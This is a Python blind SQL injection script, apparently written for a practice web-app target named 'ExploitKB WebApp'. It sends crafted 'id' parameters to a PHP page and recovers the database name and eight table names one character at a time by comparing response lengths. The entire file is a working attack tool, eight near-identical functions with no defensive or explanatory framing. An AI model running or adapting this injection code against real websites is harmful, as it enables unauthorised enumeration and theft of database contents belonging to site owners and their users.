#!/usr/bin/env python
#Author: Anakein
#Email: anakein@protonmail.ch
#Machine: ExploitKB WebApp 
#Date: 02/04/2019

try:
    from urllib.parse import urlparse
except ImportError:
    from urlparse import urlparse

import requests

characters = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
target = "http://exploitwebapp.com/artpage.php"
lenght_string = 10

lenght = 2395 #200 found chars

r = requests.get(target)
if r.status_code != requests.codes.ok:
    raise ValueError("Sorry! We cannot connect the site...")
else:
    print("Target[+]: " + target)
    print("Connection OK! We can go now...")

def letBlind():
    print("Getting database...")
    foundChars = []
    for i in range(lenght_string):
        for c in characters:
            test = ''.join(foundChars)
            blindSql = "?id=1' AND (SELECT binary database()) LIKE '"+test+"{}%'--+".format(c)
            r = requests.get(target+blindSql)
            if len(r.content) == lenght:
                foundChars.append(c) 
    print(" [+] : " + ''.join(foundChars))
 
#Starting
letBlind()

def letBlind_table1():
    print("Getting tables...")
    foundChars_T = []
    for i in range(lenght_string):
        for table in characters:
            table1_chars = ''.join(foundChars_T)
            blindTables = "?id=1' AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) LIKE '"+table1_chars+"{}%'--+".format(table)
            r = requests.get(target+blindTables)
            if len(r.content) == lenght:
                foundChars_T.append(table) 

    table_1 = ''.join(foundChars_T)
    print(" [+] 1: " + table_1.lower())
 
letBlind_table1()

def letBlind_table2():
    foundChars_T = []
    for i in range(lenght_string):
        for table in characters:
            table2_chars = ''.join(foundChars_T)
            blindTables = "?id=1' AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1) LIKE '"+table2_chars+"{}%'--+".format(table)
            r = requests.get(target+blindTables)
            if len(r.content) == lenght:
                foundChars_T.append(table) 

    table_2 = ''.join(foundChars_T)
    print(" [+] 2: " + table_2.lower())
 
letBlind_table2()

def letBlind_table3():
    foundChars_T = []
    for i in range(lenght_string):
        for table in characters:
            table3_chars = ''.join(foundChars_T)
            blindTables = "?id=1' AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 2,1) LIKE '"+table3_chars+"{}%'--+".format(table)
            r = requests.get(target+blindTables)
            if len(r.content) == lenght:
                foundChars_T.append(table) 

    table_3 = ''.join(foundChars_T)
    print(" [+] 3: " + table_3.lower())
 
letBlind_table3()

def letBlind_table4():
    foundChars_T = []
    for i in range(lenght_string):
        for table in characters:
            table4_chars = ''.join(foundChars_T)
            blindTables = "?id=1' AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 3,1) LIKE '"+table4_chars+"{}%'--+".format(table)
            r = requests.get(target+blindTables)
            if len(r.content) == lenght:
                foundChars_T.append(table) 

    table_4 = ''.join(foundChars_T)
    print(" [+] 4: " + table_4.lower())
 
letBlind_table4()

def letBlind_table5():
    foundChars_T = []
    for i in range(lenght_string):
        for table in characters:
            table5_chars = ''.join(foundChars_T)
            blindTables = "?id=1' AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 4,1) LIKE '"+table5_chars+"{}%'--+".format(table)
            r = requests.get(target+blindTables)
            if len(r.content) == lenght:
                foundChars_T.append(table) 

    table_5 = ''.join(foundChars_T)
    print(" [+] 5: " + table_5.lower())
 

letBlind_table5()

def letBlind_table6():
    foundChars_T = []
    for i in range(lenght_string):
        for table in characters:
            table6_chars = ''.join(foundChars_T)
            blindTables = "?id=1' AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 5,1) LIKE '"+table6_chars+"{}%'--+".format(table)
            r = requests.get(target+blindTables)
            if len(r.content) == lenght:
                foundChars_T.append(table) 

    table_6 = ''.join(foundChars_T)
    print(" [+] 6: " + table_6.lower())
 
letBlind_table6()

def letBlind_table7():
    foundChars_T = []
    for i in range(lenght_string):
        for table in characters:
            table7_chars = ''.join(foundChars_T)
            blindTables = "?id=1' AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 6,1) LIKE '"+table7_chars+"{}%'--+".format(table)
            r = requests.get(target+blindTables)
            if len(r.content) == lenght:
                foundChars_T.append(table) 

    table_7 = ''.join(foundChars_T)
    print(" [+] 7: " + table_7.lower())
 
letBlind_table7()

def letBlind_table8():
    foundChars_T = []
    for i in range(lenght_string):
        for table in characters:
            table8_chars = ''.join(foundChars_T)
            blindTables = "?id=1' AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 7,1) LIKE '"+table8_chars+"{}%'--+".format(table)
            r = requests.get(target+blindTables)
            if len(r.content) == lenght:
                foundChars_T.append(table) 

    table_8 = ''.join(foundChars_T)
    print(" [+] 8: " + table_8.lower())
 
letBlind_table8()
